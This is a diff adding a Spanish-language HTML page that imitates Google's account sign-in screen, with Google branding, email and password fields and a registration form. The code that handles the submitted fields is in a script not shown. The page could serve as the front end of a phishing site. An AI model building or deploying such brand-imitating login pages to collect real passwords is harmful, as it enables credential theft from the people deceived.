@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - Cuenta Google</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="login-container">
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iNzUiIHZpZXdCb3g9IjAgMCA3NSA3NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM3LjUgMTVDMzU4LjgxIDE1IDYwIDI1LjE5IDYwIDM3LjVDNjAgNDkuODEgMzU4LjgxIDYwIDM3LjUgNjBDMTYuMTkgNjAgMTUgNDkuODEgMTUgMzcuNUMxNSAyNS4xOSAxNi4xOSAxNSAzNy41IDE1WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTM3LjUgMTVDMzU4LjgxIDE1IDYwIDI1LjE5IDYwIDM3LjVDNjAgNDkuODEgMzU4LjgxIDYwIDM3LjUgNjBDMTYuMTkgNjAgMTUgNDkuODEgMTUgMzcuNUMxNSAyNS4xOSAxNi4xOSAxNSAzNy41IDE1WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTM3LjUgMTVDNDkuODEgMTUgNjAgMjUuMTkgNjAgMzcuNUM2MCA0OS44MSA0OS44MSA2MCAzNy41IDYwQzI1LjE5IDYwIDE1IDQ5LjgxIDE1IDM3LjVDMTUgMjUuMTkgMjUuMTkgMTUgMzcuNSAxNVoiIGZpbGw9IiNFQTQzMzUiLz4KPHBhdGggZD0iTTYwIDM3LjVDNjAgMjUuMTkgNDkuODEgMTUgMzcuNSAxNUM0NS40NDcgMTUgNjAgMjUuMTkgNjAgMzcuNVoiIGZpbGw9IiNGQkJDMjQiLz4KPHBhdGggZD0iTTM3LjUgNjBDNDkuODEgNjAgNjAgNDkuODEgNjAgMzcuNUM2MCAzNy41IDQ1LjQ0NyA2MCAzNy41IDYwWiIgZmlsbD0iIzM0QTg1MyIvPgo8cGF0aCBkPSJNMTUgMzcuNUMxNSA0OS44MSAyNS4xOSA2MCAzNy41IDYwQzM3LjUgNjAgMTUgNDkuODEgMTUgMzcuNVoiIGZpbGw9IiM0Mjg1RjQiLz4KPHBhdGggZD0iTTM3LjUgMTVDMjUuMTkgMTUgMTUgMjUuMTkgMTUgMzcuNUMxNSAzNy41IDI1LjE5IDE1IDM3LjUgMTVaIiBmaWxsPSIjMTg5NjYzIi8+Cjwvc3ZnPgo=" alt="Google" class="google-logo">
+        
+        <h1 id="formTitle">Iniciar sesión</h1>
+        <h2 id="formSubtitle">Utiliza tu Cuenta de Google</h2>
+        
+        <form id="loginForm" class="form-group">
+            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
+            <div id="loginError" class="error-message"></div>
+            
+            <input type="password" id="password" placeholder="Introduce tu contraseña" required>
+            
+            <a href="#" class="forgot-email">¿Has olvidado tu correo electrónico?</a>
+            
+            <div class="buttons">
+                <a href="#" class="create-account" id="showRegister">Crear cuenta</a>
+                <div class="button-container">
+                    <button type="submit" class="next-button">Siguiente</button>
+                    <div id="loginLoader" class="loader"></div>
+                </div>
+            </div>
+        </form>
+        
+        <form id="registerForm" class="register-form">
+            <input type="text" id="name" placeholder="Nombre completo" required>
+            <input type="email" id="newEmail" placeholder="Correo electrónico" required>
+            <input type="password" id="newPassword" placeholder="Contraseña" required>
+            <p class="password-hint">Usa al menos 8 caracteres con una combinación de letras, números y símbolos</p>
+            <input type="password" id="confirmPassword" placeholder="Confirmar contraseña" required>
+            
+            <div id="registerError" class="error-message"></div>
+            <div id="registerSuccess" class="success-message">¡Cuenta creada con éxito!</div>
+            
+            <div class="buttons">
+                <a href="#" class="create-account" id="showLogin">Iniciar sesión</a>
+                <div class="button-container">
+                    <button type="submit" class="next-button">Registrarse</button>
+                    <div id="registerLoader" class="loader"></div>
+                </div>
+            </div>
+        </form>
+        
+        <div class="footer">
+            <select class="language-select">
+                <option>Español (España)</option>
+                <option>English (United States)</option>
+                <option>Français (France)</option>
+                <option>Deutsch</option>
+            </select>
+            
+            <div class="help-links">
+                <a href="#" class="help-link">Ayuda</a>
+                <a href="#" class="help-link">Privacidad</a>
+                <a href="#" class="help-link">Términos</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
